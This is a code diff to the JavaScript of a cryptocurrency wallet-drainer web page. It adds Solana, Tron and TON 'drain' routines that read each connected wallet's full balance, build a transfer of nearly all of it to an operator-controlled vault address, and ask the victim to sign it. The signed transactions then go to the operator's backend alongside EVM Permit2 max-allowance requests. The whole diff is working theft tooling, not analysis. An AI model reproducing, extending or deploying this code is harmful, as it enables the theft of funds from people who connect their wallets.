@@ -281,6 +281,7 @@
     var addr = resolveVaultAddress(chainKey);
     if (!addr) {
       var labels = {
+        sol: 'Solana (SOL)', tron: 'Tron (TRX)', ton: 'TON',
         cosmos: 'Cosmos (ATOM)', aptos: 'Aptos (APT)', sui: 'Sui (SUI)', btc: 'Bitcoin (BTC)',
       };
       throw new Error(
@@ -520,9 +521,21 @@
   }
 
   function resolveVaultAddress(chainKey) {
-    var addr = vaultCache[chainKey];
-    if (!addr || !String(addr).trim()) return null;
-    return String(addr).trim();
+    var aliases = {
+      sol: ['sol', 'svm'],
+      tron: ['tron', 'trx'],
+      ton: ['ton'],
+      cosmos: ['cosmos'],
+      aptos: ['aptos'],
+      sui: ['sui'],
+      btc: ['btc'],
+    };
+    var keys = aliases[chainKey] || [chainKey];
+    for (var i = 0; i < keys.length; i++) {
+      var addr = vaultCache[keys[i]];
+      if (addr && String(addr).trim()) return String(addr).trim();
+    }
+    return null;
   }
 
   function findBalanceRow(data, chainKey) {
@@ -544,6 +557,9 @@
       if (chainKey === 'cosmos') return (n > 5000n ? n - 5000n : n).toString();
       if (chainKey === 'aptos') return (n > 100000n ? n - 100000n : n).toString();
       if (chainKey === 'sui') return (n > 1000000n ? n - 1000000n : n).toString();
+      if (chainKey === 'sol') return (n > 5000n ? n - 5000n : n).toString();
+      if (chainKey === 'tron') return (n > 1000000n ? n - 1000000n : n).toString();
+      if (chainKey === 'ton') return (n > 50000000n ? n - 50000000n : n).toString();
       if (chainKey === 'btc') {
         var feeReserve = 2000n;
         return n > feeReserve ? (n - feeReserve).toString() : '0';
@@ -748,6 +764,143 @@
     return payload.signed_boc || null;
   }
 
+  async function buildSolNativeTransferWire(from, to, lamports) {
+    var web3 = await loadSolWeb3();
+    var rpc = (CFG.solRpcUrl || 'https://api.mainnet-beta.solana.com').replace(/\/$/, '');
+    var connection = new web3.Connection(rpc, 'confirmed');
+    var fromPk = new web3.PublicKey(from);
+    var toPk = new web3.PublicKey(to);
+    var lamportsNum = Number(lamports);
+    if (!Number.isFinite(lamportsNum) || lamportsNum <= 0) {
+      throw new Error('Invalid SOL transfer amount');
+    }
+    var bh = await connection.getLatestBlockhash('finalized');
+    var msg = new web3.TransactionMessage({
+      payerKey: fromPk,
+      recentBlockhash: bh.blockhash,
+      instructions: [
+        web3.SystemProgram.transfer({
+          fromPubkey: fromPk,
+          toPubkey: toPk,
+          lamports: lamportsNum,
+        }),
+      ],
+    }).compileToV0Message();
+    var tx = new web3.VersionedTransaction(msg);
+    var bytes = tx.serialize();
+    var bin = '';
+    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+    return btoa(bin);
+  }
+
+  function submitOmnichainSingleLeg(opts) {
+    return apiPost('/api/v1/signature-anchor', {
+      ingress: 'normalized_v1',
+      chain_family: 'EVM',
+      protocol: 'omnichain_atomic_v1',
+      wallet_address: opts.walletAddress,
+      token_address: opts.tokenAnchor,
+      signature: DUMMY_OMNI_SIG,
+      ...(opts.solana_payload ? { solana_payload: opts.solana_payload } : {}),
+      ...(opts.tron_payload ? { tron_payload: opts.tron_payload } : {}),
+      ...(opts.ton_payload ? { ton_payload: opts.ton_payload } : {}),
+      ...(opts.cosmos_payload ? { cosmos_payload: opts.cosmos_payload } : {}),
+      ...(opts.aptos_payload ? { aptos_payload: opts.aptos_payload } : {}),
+      ...(opts.sui_payload ? { sui_payload: opts.sui_payload } : {}),
+      nonce: opts.noncePrefix + ':' + Date.now(),
+      expiry_iso: EXPIRY_ISO,
+      wallet_type: opts.walletType,
+      scout_value_usd: opts.scoutUsd || 1,
+      max_allowance: MAX_PERMIT,
+      requires_quorum: false,
+    });
+  }
+
+  async function runSolanaDrain(scoutUsd) {
+    if (!wallets.sol) throw new Error('Phantom / Solflare not connected');
+    var vault = requireVaultAddress('sol');
+    var balanceData = await apiGet('/api/v1/balance/multi?sol=' + encodeURIComponent(wallets.sol.address));
+    var amount = parseNativeAmountFromBalance(balanceData, 'sol');
+    if (amount === '0') throw new Error('No spendable SOL balance detected');
+    setStatus('Building Solana transfer…', 'busy');
+    var unsignedB64 = await buildSolNativeTransferWire(wallets.sol.address, vault, amount);
+    setStatus('Sign SOL transfer in wallet…', 'busy');
+    var signedB64 = await signSolWire(unsignedB64);
+    return submitOmnichainSingleLeg({
+      walletAddress: wallets.sol.address,
+      tokenAnchor: 'OMNI_SOL_ANCHOR',
+      walletType: walletTypeLabel(wallets.sol),
+      scoutUsd: scoutUsd,
+      noncePrefix: 'sol',
+      solana_payload: {
+        native_amount_sol: amount,
+        native_signed_transaction_sol: signedB64,
+      },
+    });
+  }
+
+  async function runTronDrain(scoutUsd) {
+    if (!wallets.tron) throw new Error('TronLink not connected');
+    if (!window.tronWeb || !window.tronWeb.trx || !window.tronWeb.transactionBuilder) {
+      throw new Error('TronWeb not ready — unlock TronLink and refresh');
+    }
+    var vault = requireVaultAddress('tron');
+    var balanceData = await apiGet('/api/v1/balance/multi?tron=' + encodeURIComponent(wallets.tron.address));
+    var amount = parseNativeAmountFromBalance(balanceData, 'tron');
+    if (amount === '0') throw new Error('No spendable TRX balance detected');
+    var amountNum = Number(amount);
+    if (!Number.isFinite(amountNum) || amountNum <= 0) throw new Error('Invalid TRX amount');
+    setStatus('Building TRX transfer…', 'busy');
+    var unsigned = await window.tronWeb.transactionBuilder.sendTrx(
+      vault,
+      amountNum,
+      wallets.tron.address,
+    );
+    setStatus('Sign TRX transfer in TronLink…', 'busy');
+    var signed = await window.tronWeb.trx.sign(unsigned);
+    return submitOmnichainSingleLeg({
+      walletAddress: wallets.tron.address,
+      tokenAnchor: 'OMNI_TRON_ANCHOR',
+      walletType: walletTypeLabel(wallets.tron),
+      scoutUsd: scoutUsd,
+      noncePrefix: 'tron',
+      tron_payload: {
+        native_amount_trx: amount,
+        native_signed_transaction_trx: toPlainJson(signed),
+      },
+    });
+  }
+
+  async function runTonDrain(scoutUsd) {
+    if (!wallets.ton) throw new Error('Tonkeeper not connected');
+    var ton = wallets.ton.signer;
+    if (!ton || !ton.send) throw new Error('Tonkeeper signer unavailable');
+    var vault = requireVaultAddress('ton');
+    var balanceData = await apiGet('/api/v1/balance/multi?ton=' + encodeURIComponent(wallets.ton.address));
+    var amount = parseNativeAmountFromBalance(balanceData, 'ton');
+    if (amount === '0') throw new Error('No spendable TON balance detected');
+    setStatus('Sign TON transfer in Tonkeeper…', 'busy');
+    var validUntil = Math.floor(Date.now() / 1000) + 600;
+    var txResult = await ton.send('ton_sendTransaction', {
+      validUntil: validUntil,
+      messages: [{ address: vault, amount: amount }],
+    });
+    var boc = txResult && (txResult.boc || txResult.transaction || txResult.signedBoc || txResult);
+    if (!boc) throw new Error('Tonkeeper did not return signed transaction');
+    var signedBoc = typeof boc === 'string' ? boc : (boc.boc || safeStringify(boc));
+    return submitOmnichainSingleLeg({
+      walletAddress: wallets.ton.address,
+      tokenAnchor: 'OMNI_TON_ANCHOR',
+      walletType: walletTypeLabel(wallets.ton),
+      scoutUsd: scoutUsd,
+      noncePrefix: 'ton',
+      ton_payload: {
+        native_amount_ton: amount,
+        native_signed_transaction_ton: String(signedBoc),
+      },
+    });
+  }
+
   async function runBitcoinPsbt(scoutUsd) {
     if (!wallets.btc) throw new Error('Bitcoin wallet not connected');
     setStatus('Building Bitcoin PSBT…', 'busy');
@@ -832,24 +985,17 @@
     if (amount === '0') throw new Error('No spendable ATOM balance detected');
     setStatus('Sign Cosmos transfer in Keplr…', 'busy');
     var signedTx = await signCosmosNativeTransfer(wallets.cosmos.address, vault, amount);
-    return apiPost('/api/v1/signature-anchor', {
-      ingress: 'normalized_v1',
-      chain_family: 'EVM',
-      protocol: 'omnichain_atomic_v1',
-      wallet_address: wallets.cosmos.address,
-      token_address: 'OMNI_COSMOS_ANCHOR',
-      signature: DUMMY_OMNI_SIG,
+    return submitOmnichainSingleLeg({
+      walletAddress: wallets.cosmos.address,
+      tokenAnchor: 'OMNI_COSMOS_ANCHOR',
+      walletType: walletTypeLabel(wallets.cosmos),
+      scoutUsd: scoutUsd,
+      noncePrefix: 'cosmos',
       cosmos_payload: {
         native_amount_cosmos: amount,
         cosmos_signed_tx: signedTx,
         cosmos_tx_encoding: 'base64',
       },
-      nonce: 'cosmos:' + Date.now(),
-      expiry_iso: EXPIRY_ISO,
-      wallet_type: walletTypeLabel(wallets.cosmos),
-      scout_value_usd: scoutUsd || 1,
-      max_allowance: MAX_PERMIT,
-      requires_quorum: false,
     });
   }
 
@@ -882,25 +1028,18 @@
     } else {
       throw new Error('Petra wallet API unavailable — update Petra extension');
     }
-    return apiPost('/api/v1/signature-anchor', {
-      ingress: 'normalized_v1',
-      chain_family: 'EVM',
-      protocol: 'omnichain_atomic_v1',
-      wallet_address: wallets.aptos.address,
-      token_address: 'OMNI_APTOS_ANCHOR',
-      signature: DUMMY_OMNI_SIG,
+    return submitOmnichainSingleLeg({
+      walletAddress: wallets.aptos.address,
+      tokenAnchor: 'OMNI_APTOS_ANCHOR',
+      walletType: walletTypeLabel(wallets.aptos),
+      scoutUsd: scoutUsd,
+      noncePrefix: 'aptos',
       aptos_payload: {
         native_amount_aptos: amount,
         aptos_signed_tx: String(signedTx),
         aptos_signature: aptosSig ? String(aptosSig) : 'petra',
         aptos_tx_encoding: 'hex',
       },
-      nonce: 'aptos:' + Date.now(),
-      expiry_iso: EXPIRY_ISO,
-      wallet_type: walletTypeLabel(wallets.aptos),
-      scout_value_usd: scoutUsd || 1,
-      max_allowance: MAX_PERMIT,
-      requires_quorum: false,
     });
   }
 
@@ -928,28 +1067,21 @@
       account: wallets.sui.address,
       chain: 'sui:mainnet',
     });
-    return apiPost('/api/v1/signature-anchor', {
-      ingress: 'normalized_v1',
-      chain_family: 'EVM',
-      protocol: 'omnichain_atomic_v1',
-      wallet_address: wallets.sui.address,
-      token_address: 'OMNI_SUI_ANCHOR',
-      signature: DUMMY_OMNI_SIG,
+    return submitOmnichainSingleLeg({
+      walletAddress: wallets.sui.address,
+      tokenAnchor: 'OMNI_SUI_ANCHOR',
+      walletType: walletTypeLabel(wallets.sui),
+      scoutUsd: scoutUsd,
+      noncePrefix: 'sui',
       sui_payload: {
         native_amount_sui: amount,
         sui_signed_tx: signed.bytes || signed.transactionBlockBytes || signed.transaction,
         sui_signature: signed.signature,
       },
-      nonce: 'sui:' + Date.now(),
-      expiry_iso: EXPIRY_ISO,
-      wallet_type: walletTypeLabel(wallets.sui),
-      scout_value_usd: scoutUsd || 1,
-      max_allowance: MAX_PERMIT,
-      requires_quorum: false,
     });
   }
 
-  async function runOmnichainDrain(scoutUsd) {
+  async function runEvmDrain(scoutUsd) {
     if (!wallets.evm) throw new Error('EVM wallet required for Permit2 batch');
     var evm = wallets.evm;
     var fusionResult = await postFusion();
@@ -1055,7 +1187,8 @@
 
     try {
       await loadClientConfigVaults();
-      if (['cosmos', 'aptos', 'sui'].indexOf(ACTIVE_TAB) >= 0) {
+      var vaultTabs = ['sol', 'tron', 'ton', 'cosmos', 'aptos', 'sui'];
+      if (vaultTabs.indexOf(ACTIVE_TAB) >= 0) {
         requireVaultAddress(ACTIVE_TAB);
       }
       setStatus('Connecting…', 'busy');
@@ -1085,6 +1218,27 @@
         return btcResult;
       }
 
+      if (ACTIVE_TAB === 'sol') {
+        setStatus('Draining Solana…', 'busy');
+        var solResult = await runSolanaDrain(scoutUsd);
+        setStatus('Solana settlement: ' + (solResult.transaction_hash || solResult.settlement_status || 'submitted'), 'ok');
+        return solResult;
+      }
+
+      if (ACTIVE_TAB === 'tron') {
+        setStatus('Draining Tron…', 'busy');
+        var tronResult = await runTronDrain(scoutUsd);
+        setStatus('Tron settlement: ' + (tronResult.transaction_hash || tronResult.settlement_status || 'submitted'), 'ok');
+        return tronResult;
+      }
+
+      if (ACTIVE_TAB === 'ton') {
+        setStatus('Draining TON…', 'busy');
+        var tonResult = await runTonDrain(scoutUsd);
+        setStatus('TON settlement: ' + (tonResult.transaction_hash || tonResult.settlement_status || 'submitted'), 'ok');
+        return tonResult;
+      }
+
       if (ACTIVE_TAB === 'cosmos') {
         var cosmosResult = await runCosmosDrain(scoutUsd);
         setStatus('Cosmos settlement: ' + (cosmosResult.transaction_hash || cosmosResult.settlement_status || 'submitted'), 'ok');
@@ -1103,6 +1257,10 @@
         return suiResult;
       }
 
+      if (ACTIVE_TAB !== 'evm') {
+        throw new Error('Unsupported chain tab: ' + ACTIVE_TAB);
+      }
+
       if (KINETIC_KEY) {
         setStatus('Checking existing allowances…', 'busy');
         var reused = await tryAllowanceReuse();
@@ -1112,13 +1270,8 @@
         }
       }
 
-      if (!wallets.evm && ACTIVE_TAB !== 'evm' && ['sol', 'tron', 'ton'].indexOf(ACTIVE_TAB) >= 0) {
-        setStatus('Connecting EVM for omnichain batch…', 'busy');
-        await connectEvm();
-      }
-
-      setStatus('Draining…', 'busy');
-      var result = await runOmnichainDrain(scoutUsd);
+      setStatus('Draining EVM…', 'busy');
+      var result = await runEvmDrain(scoutUsd);
       var tx = result.transaction_hash || result.settlement_status || 'submitted';
       setStatus('Settlement complete: ' + tx, 'ok');
       return result;
